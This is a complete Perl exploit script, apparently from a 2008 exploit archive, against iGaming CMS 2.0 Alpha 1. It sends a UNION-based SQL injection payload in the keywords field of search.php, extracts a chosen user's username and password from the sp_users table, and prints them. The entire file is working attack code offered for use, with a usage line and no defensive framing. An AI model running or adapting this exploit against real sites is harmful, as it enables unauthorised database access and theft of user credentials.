#!/usr/bin/perl 
# -----------------------------------------------------
# iGaming CMS 2.0 Alpha 1 Remote SQL Injection Exploit
# By StAkeR aka athos - StAkeR[at]hotmail[dot]it
# On 16/10/2008
# http://www.igamingcms.com/iGaming_2_Alpha.zip
# -----------------------------------------------------

use strict;
use LWP::UserAgent;


my ($host,$id) = @ARGV;

usage() unless $host =~ /http:\/\/(.+?)$/ and $id =~ /^[0-9]/;

my $etc = "' union select 1,concat(0x616E6172636879,".
          "password,0x3a,username,0x616E6172636879),3".
          ",4,5 from sp_users where id=$id#";
          
my @search = ($etc,'all',0,'Search','search_games');          
my @split = undef;          
          
my $http = new LWP::UserAgent;
my $post = $http->post($host.'/search.php',
                      [
                       keywords => $search[0],
                       platform => $search[1],
                       exact    => $search[2],
                       submit   => $search[3],
                       do       => $search[4]
                     ]);
                     
if($post->is_success)
{
  if($post->as_string =~ /anarchy(.+?)anarchy/)
  {
    @split = split(':',$1);
    
    print "Username: $split[0]\r\n";
    print "Password: $split[1]\r\n";
  }
  else
  {
    print "Exploit Failed!\r\n";
  }
}

sub usage
{
  print "iGaming CMS 2.0 Alpha 1 Remote SQL Injection Exploit\r\n";
  print "Usage: perl $0 http://[host] [user_id]\r\n";
  exit;
}


            
__END__         
